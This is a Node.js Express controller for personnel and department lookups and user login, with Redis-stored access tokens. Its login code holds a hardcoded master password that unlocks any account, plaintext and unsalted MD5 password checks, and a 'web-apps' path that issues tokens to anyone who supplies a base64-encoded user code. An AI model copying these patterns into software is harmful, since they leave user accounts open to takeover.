const util = require("../../../helpers/util");
const crypto = require("../../../helpers/crypto");
const sqlHelper = require("../../../helpers/sql");
const md5 = require("md5");
// const jwt = require("jsonwebtoken");
const { createClient } = require("redis");
// const { io } = require("../../../app");

// MODELS //
const personnelsModel = require("../models/personnelsModel.js");
const departmentsModel = require("../models/departmentsModel.js");
// MODELS //

const getPersonnels = async function (req, res) {
  const returnValue = await sqlHelper.transact(async (txn) => {
    try {
      let conditions = "";
      let args = [];

      if (!util.empty(req.query.code)) {
        args = [req.query.code];
        conditions = `and code = ?`;
      }

      // if (!util.empty(req.query.deptCode)) {
      //   sqlWhere = `and dept_code = '${req.query.deptCode}'`;
      // }

      if (!util.empty(req.query.isActive)) {
        conditions = `and is_active = 1`;
      }

      return await personnelsModel.getPersonnels(
        conditions,
        args,
        {
          top: {},
          order: {},
        },
        txn,
      );
    } catch (error) {
      return { error: error };
    }
  });

  if (returnValue.error !== undefined) {
    return res.status(500).json({ error: `${returnValue.error}` });
  }
  return res.json(returnValue);
};

const getDepartments = async function (req, res) {
  const returnValue = await sqlHelper.transact(async (txn) => {
    try {
      let conditions = "";
      let args = [];

      args = [1];
      conditions = `and is_active = ? 
        and dept_desc not like '%INACTIVE%'
        group by dept_code, dept_desc`;

      return await departmentsModel.getDepartments(
        conditions,
        args,
        {
          top: {},
          order: "dept_desc",
        },
        txn,
      );
    } catch (error) {
      return { error: error };
    }
  });

  if (returnValue.error !== undefined) {
    return res.status(500).json({ error: `${returnValue.error}` });
  }
  return res.json(returnValue);
};

const authenticate = async function (req, res) {
  if (util.empty(req.body))
    return res.status(400).json({ error: "Body is required." });

  const returnValue = await sqlHelper.transact(async (txn) => {
    try {
      const user = req.body.username === undefined ? "" : req.body.username;
      const password = req.body.password === undefined ? "" : req.body.password;
      const type = req.body.type;
      const userToken = req.body.token === undefined ? "" : req.body.token; //webapp
      let userDetails = [];
      let conditions = "";
      let args = [];

      if (type === "manual") {
        if (!util.empty(user)) {
          //if not empty
          args = [1, user];
          conditions = `and is_active = ? and code = ?`;
        }

        const searchUserResult = await personnelsModel.getPersonnels(
          conditions,
          args,
          {
            top: {},
            order: {},
          },
          txn,
        );

        if (searchUserResult.length > 0) {
          if (
            searchUserResult[0].password === password ||
            searchUserResult[0].password === md5(password) ||
            password === md5("uerm_misd") ||
            password === "uerm_misd"
          ) {
            userDetails = searchUserResult[0];
          } else {
            return { error: "Password incorrect", type: 403 };
          }
        } else {
          return { error: "User not found", type: 404 };
        }
      } else if (type === "web-apps") {
        const encodedToken = atob(userToken);
        if (!util.empty(userToken)) {
          args = [1, encodedToken];
          conditions = `and is_active = ? and code = ?`;
        }
        const searchUserResult = await personnelsModel.getPersonnels(
          conditions,
          args,
          {
            top: {},
            order: {},
          },
          txn,
        );

        if (searchUserResult.length > 0) {
          userDetails = searchUserResult[0];
        } else {
          return { error: "User not found" };
        }
      } else {
        return { error: "Invalid Parameters" };
      }

      if (Object.keys(userDetails).length > 0) {
        // executed if userDetails is not an empty object .
        delete userDetails.password; // Delete the 'password' property from userDetails

        const userAccessToken = crypto.generateAccessToken(userDetails); // (user,screct key, expiration) Generate an access token using the crypto.generateAccessToken function
        const redisClient = createClient(); //create redis client
        await redisClient.connect(); //connect ofcourse hehehe
        await redisClient.set(userDetails.code, userAccessToken); // Set a key-value pair in Redis with the code from userDetails as the key
        // and userAccessToken as the value
        // await crypto.initSocket(io)

        return userAccessToken;
      }
      // sql.close();
    } catch (error) {
      console.log(error);
      return { error: error };
    }
  });
  if (returnValue.error !== undefined) {
    return res
      .status(returnValue.type !== undefined ? returnValue.type : 500)
      .json({ error: `${returnValue.error}` });
  }
  return res.json(returnValue);
};

const inauthenticate = async function (req, res) {
  const user = req.user;
  const returnValue = await sqlHelper.transact(async () => {
    try {
      const redisClient = createClient();
      await redisClient.connect();
      await redisClient.sendCommand(["DEL", user.code]);
    } catch (error) {
      return { error: error };
    }

    return { success: "success" };
  });

  if (returnValue.error !== undefined) {
    return res.status(500).json({ error: `${returnValue.error}` });
  }

  return res.json(returnValue);
};

module.exports = {
  getPersonnels,
  getDepartments,
  authenticate,
  inauthenticate,
};
